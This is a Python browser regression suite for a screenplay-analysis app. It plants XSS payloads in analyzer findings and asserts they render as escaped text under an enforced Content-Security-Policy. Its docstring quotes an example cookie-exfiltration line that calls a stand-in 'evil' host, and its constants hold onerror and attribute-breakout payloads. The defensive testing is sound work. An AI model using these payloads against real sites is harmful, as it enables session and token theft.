"""Regression suite: model- and script-controlled text must render INERT.

Origin of this suite (2026-09-21 production-readiness audit, finding FE-C1):
`renderProblemBoard()` built its rows by string concatenation into
`innerHTML`, interpolating `f.category` and `f.description || f.issue` raw.
Finding text is model output derived from the writer's own script, and the
server does not escape it (`_sanitize_report` only *filters* feedback), so a
screenplay containing a dialogue line like

    <img src=x onerror="fetch('http://evil/'+document.cookie)">

reached `innerHTML` and executed in the app origin on project open. Because
`studio_token` was a JS-readable (non-HttpOnly) cookie, that XSS could read the
capability token and then drive every mutating API route — a full-script
exfiltration chain from nothing but a hostile .fountain file.

This suite plants payloads at each sink and asserts they render as TEXT. It
fails against the pre-fix code and guards the class going forward: escaping one
sink while leaving its siblings raw is the exact regression it catches.

It boots with the capability token ON (unlike most suites' --no-token default)
so the "injected JS cannot read the token" leg is a real assertion, not a
vacuous one.

Run:  python tests/e2e_browser_xss_inert.py
"""
import json
import os
import sys
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from e2e_browser_common import Checks, assert_no_js_errors, launch  # noqa: E402

# Each payload sets a DISTINCT global so one run tells us which sink leaked.
# `onerror` on a broken <img> is the realistic vector: no user interaction, and
# it fires the moment the browser parses the injected markup.
PAYLOAD_TEXT = (
    '<img src=x onerror="window.__XSS_BOARD=1;window.__XSS_COOKIE=document.cookie;">'
)
PAYLOAD_ATTR = '1" onmouseover="window.__XSS_ATTR=1'
PAYLOAD_FV = '<img src=x onerror="window.__XSS_FV=1">'

# Records any CSP block so the policy itself is verified, not assumed.
CSP_SPY = """
window.__CSP_VIOLATIONS = [];
document.addEventListener('securitypolicyviolation', (e) => {
  window.__CSP_VIOLATIONS.push(e.violatedDirective + ' :: ' + e.blockedURI);
});
"""


def finding(issue, scene=1, category="dialogue", severity="high"):
    """One finding as the analyzer would write it to report.findings.json."""
    return {
        "category": category,
        "severity": severity,
        "issue": issue,
        "description": issue,
        "evidence_quote": "",
        "scene_refs": [scene],
        "scene": scene,
        "rule_id": None,
        "check_id": None,
    }


def post(base, path, body=None, headers=None):
    data = json.dumps(body or {}).encode()
    h = {"Content-Type": "application/json"}
    h.update(headers or {})
    req = urllib.request.Request(base + path, data=data, headers=h, method="POST")
    with urllib.request.urlopen(req, timeout=180) as r:
        return json.loads(r.read().decode() or "{}")


def get(base, path):
    with urllib.request.urlopen(base + path, timeout=60) as r:
        return json.loads(r.read().decode() or "{}")


def run(base, projects_dir, headers):
    checks = Checks()

    # ---- 1. a real project with a real report ------------------------------
    sample = post(base, "/api/sample", headers=headers)
    name = sample.get("project")
    checks.ok("sample project created", bool(name), f"got {name!r}")
    post(base, f"/api/projects/{name}/analyze", headers=headers)

    report_path = os.path.join(projects_dir, name, "report.findings.json")
    with open(report_path, "r", encoding="utf-8") as f:
        report = json.load(f)
    baseline = len(report.get("findings") or [])
    checks.ok("demo analysis produced findings", baseline > 0, f"{baseline}")

    # ---- 2. plant the payloads where the model would put them --------------
    planted = [
        finding(PAYLOAD_TEXT, scene=1),
        finding(PAYLOAD_FV, scene=2, category="structure"),
        finding("ordinary finding — control", scene=3, severity="low"),
        finding("attribute probe", scene=PAYLOAD_ATTR, severity="medium"),
    ]
    report["findings"] = (report.get("findings") or []) + planted
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)

    # The server must still hand the payload over verbatim: escaping is a
    # RENDER concern. If the server silently stripped it, this suite could pass
    # for the wrong reason. (Compare against the field VALUES — a json.dumps
    # round-trip escapes the payload's own quotes and can never match.)
    served = get(base, f"/api/projects/{name}/report")
    served_findings = served.get("findings") or []
    raw_served = any(
        PAYLOAD_TEXT in (f.get("issue") or "") or PAYLOAD_TEXT in (f.get("description") or "")
        for f in served_findings)
    checks.ok("server serves the payload raw (escaping is a render concern)",
              raw_served)
    checks.ok("sanitizer kept every planted finding",
              len(served_findings) == baseline + len(planted),
              f"{len(served_findings)} served vs {baseline + len(planted)} planted")

    # ---- 3. drive the REAL app path in a browser ---------------------------
    from playwright.sync_api import sync_playwright
    with sync_playwright() as pw:
        browser, page, errors = launch(pw)
        page.add_init_script(CSP_SPY)
        page.goto(base, wait_until="domcontentloaded")
        page.wait_for_timeout(800)
        cookie_before = page.evaluate("() => document.cookie")

        # openProject() is the app's own entry point — it fetches the report and
        # calls showProblemBoard() when findings exist.
        page.evaluate("(n) => openProject(n)", name)
        page.wait_for_timeout(2500)

        # --- the exploit itself ---
        fired = page.evaluate(
            "() => ({board: window.__XSS_BOARD===1, fv: window.__XSS_FV===1,"
            " attr: window.__XSS_ATTR===1})")
        checks.ok("Problem Board payload did NOT execute",
                  fired["board"] is False, "arbitrary JS ran from finding text")
        checks.ok("FV-board payload did NOT execute",
                  fired["fv"] is False, "dormant sink is live")

        # The scene number is interpolated into the row's ATTRIBUTES. A payload
        # there must not be able to create a handler attribute — the structural
        # form of the check, which holds whatever event name an attacker picks.
        injected_handlers = page.evaluate(
            "() => document.querySelectorAll("
            "'#pb-list [onmouseover], #pb-list [onerror], #pb-list [onclick], "
            "#pb-list [onload], #pb-list [onfocus], #pb-list [onmouseenter]')"
            ".length")
        checks.ok("no event-handler attributes are built from finding data",
                  injected_handlers == 0,
                  f"{injected_handlers} handler attribute(s) found")

        # …and it must not fire even when the row is actually interacted with
        # (a payload in an unused attribute would otherwise pass vacuously).
        page.evaluate(
            "() => document.querySelectorAll('#pb-list .pb-item').forEach("
            "n => n.dispatchEvent(new MouseEvent('mouseover', {bubbles:true})))")
        page.wait_for_timeout(300)
        checks.ok("attribute-context payload did NOT execute on interaction",
                  page.evaluate("() => window.__XSS_ATTR === 1") is False,
                  "broke out of the scene attribute")

        stolen = page.evaluate("() => window.__XSS_COOKIE || null")
        checks.ok("capability token was NOT readable by injected JS",
                  stolen is None, f"leaked {stolen!r}")

        # --- and the findings must still be USABLE, not just safe ---
        rows = page.evaluate(
            "() => document.querySelectorAll('#pb-list .pb-item').length")
        checks.ok("board still renders every finding",
                  rows == baseline + len(planted),
                  f"{rows} rows vs expected {baseline + len(planted)}")

        issues = page.evaluate(
            "() => Array.from(document.querySelectorAll('#pb-list .pb-issue'))"
            ".map(n => n.textContent)")
        checks.ok("payload is shown as literal TEXT (not swallowed)",
                  any(PAYLOAD_TEXT in t for t in issues),
                  "the finding text vanished instead of being escaped")

        board_html = page.evaluate(
            "() => { const n = document.querySelector('#pb-list');"
            " return n ? n.innerHTML : null; }")
        checks.ok("markup in the DOM is escaped, not raw",
                  bool(board_html) and "&lt;img" in board_html
                  and "<img" not in board_html)

        # --- the delegation refactor must still WORK ---
        page.evaluate(
            "() => { const it = document.querySelector('#pb-list .pb-item');"
            " if (it) it.click(); }")
        page.wait_for_timeout(500)
        checks.ok("board rows are still clickable after delegation",
                  page.evaluate(
                      "() => !!document.querySelector('#pb-list .pb-item')"))

        # --- the dormant Feedback view must not be a landmine ---
        # renderFeedbackView() has no live caller, but its targets still exist
        # in index.html; invoking it directly guards against a future re-enable
        # resurrecting the raw-script-text sink.
        page.evaluate("() => { try { renderFeedbackView(); } catch (e) {} }")
        page.wait_for_timeout(600)
        checks.ok("dormant FV script sink is inert when invoked",
                  page.evaluate("() => window.__XSS_FV === 1") is False)
        fv_html = page.evaluate(
            "() => { const n = document.getElementById('fv-script');"
            " return n ? n.innerHTML : null; }")
        checks.ok("FV script renderer escapes raw script text",
                  fv_html is None or "<img" not in fv_html)

        # --- the containment layer ---
        # The app itself must run clean under the policy (captured BEFORE the
        # deliberate breach attempt below, which legitimately adds a violation).
        violations = page.evaluate("() => window.__CSP_VIOLATIONS || []")
        checks.ok("the app itself triggers no CSP violations",
                  len(violations) == 0, "; ".join(violations[:3]))

        # Assert the policy is actually PRESENT (an absent CSP also reports zero
        # violations, so the check above would otherwise pass vacuously)…
        with urllib.request.urlopen(base + "/", timeout=30) as r:
            csp = r.headers.get("Content-Security-Policy", "")
        checks.ok("SPA document carries a Content-Security-Policy", bool(csp), csp)
        checks.ok("policy pins script-src to 'self' with no inline/eval escape",
                  "script-src 'self'" in csp
                  and "unsafe-eval" not in csp
                  and "unsafe-inline" not in csp.split("style-src")[0], csp)

        # …and prove the policy is ENFORCED, not decorative: an inline handler
        # injected straight into the DOM must be refused. This is the backstop
        # that contains any sink the escaping pass might miss.
        page.evaluate("""() => {
            const d = document.createElement('div');
            d.innerHTML = '<img src=x onerror="window.__CSP_BYPASS=1">';
            document.body.appendChild(d);
        }""")
        page.wait_for_timeout(600)
        checks.ok("an injected inline handler is refused by the policy",
                  page.evaluate("() => window.__CSP_BYPASS === 1") is False,
                  "the CSP did not stop an inline handler — containment is broken")

        checks.ok("cookie state unchanged (nothing exfiltrated)",
                  page.evaluate("() => document.cookie") == cookie_before)

        assert_no_js_errors(checks, errors)
        browser.close()

    checks.finish()


if __name__ == "__main__":
    from e2e_browser_common import start_studio, studio_headers
    # Token ON: this suite proves the whole chain, including that injected JS
    # cannot lift the capability token.
    with start_studio(use_token=True) as studio:
        run(studio.base_url, studio.projects_dir,
            studio_headers(studio.base_url))
